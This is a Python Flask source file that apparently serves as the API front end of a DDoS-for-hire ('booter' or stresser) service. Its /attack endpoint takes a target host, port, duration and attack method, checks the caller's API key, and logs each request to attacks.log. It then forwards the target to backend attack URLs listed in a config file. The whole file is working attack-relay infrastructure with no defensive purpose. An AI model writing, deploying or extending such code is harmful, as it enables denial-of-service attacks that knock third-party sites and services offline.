import yaml
import toml
import requests
import ipaddress
import time
from urllib.parse import urlparse
from flask import Flask, send_file, request, jsonify

# Open the config file and read the contents
with open('config.yml', 'r') as f:
    config = yaml.safe_load(f)

# Read the settings.toml file
config_toml = toml.load('settings.toml')
blacklisted_domains = config_toml.get('config').get('blacklist')
apikeys = config_toml.get('config').get('keys')
maxtime = int(config_toml.get('config').get('maxtime'))

# Get the list of methods from the config file
methods = config['methods']

app = Flask(__name__)

@app.route("/")
def index():
    return "shiiii"

@app.route("/attack")
def attack():
    # Get the host argument from the request
    host = request.args.get('host')

    # Check if the host argument is a valid IP address or URL
    is_valid_ip = False
    is_valid_url = False
    try:
        # Check if the host argument is a valid IP address
        ip = ipaddress.ip_address(host)
        is_valid_ip = True
    except ValueError:
        # Check if the host argument is a valid URL
        url = urlparse(host)
        if url.scheme and url.netloc:
            is_valid_url = True

    # If the host argument is not a valid IP address or URL, return an error
    if not (is_valid_ip or is_valid_url):
        return jsonify(
            error="True",
            message="Invalid host. Host must be a valid IP address or URL."
        ), 451

    for domain in blacklisted_domains:
        if domain in host:
            return jsonify(
                error="True",
                message="Host is blacklisted."
            ), 451

    key = request.args.get('key')
    port = int(request.args.get('port'))
    duration = int(request.args.get('time'))
    method = request.args.get('method')
    if key not in apikeys:
        return jsonify(
            error="True",
            message="API Key Invalid."
        ), 451
    elif port > 65535:
        return jsonify(
            error="True",
            message="Invalid Port."
        ), 451
    elif duration > maxtime:
        return jsonify(
            error="True",
            message="Max Time Exceeded."
        ), 451
    else:
        with open('attacks.log', 'a') as f:
            f.write(f"{key} - {host}:{port} - {duration}s - {method}\n")
        # Check if the specified method is in the list of methods from the config file
        if method in methods:
            # Get the list of URLs for the specified method from the config file
            urls = methods[method]

            # Start the timer
            start_time = time.perf_counter()

            # Iterate over the list of URLs and send a request to each URL
            for url in urls:
                requests.get(f"{url}?host={host}&time={duration}&port={port}&method={method}")

            # Stop the timer
            end_time = time.perf_counter()

            # Compute the elapsed time
            elapsed_time = end_time - start_time

            return jsonify(
                error="False",
                host=host,
                port=port,
                time=duration,
                method=method,
                elapsed=elapsed_time
            )
        else:
            return jsonify(
                error="True",
                message="Method Not Found."
            ), 451

app.run(host="0.0.0.0",port=7331)
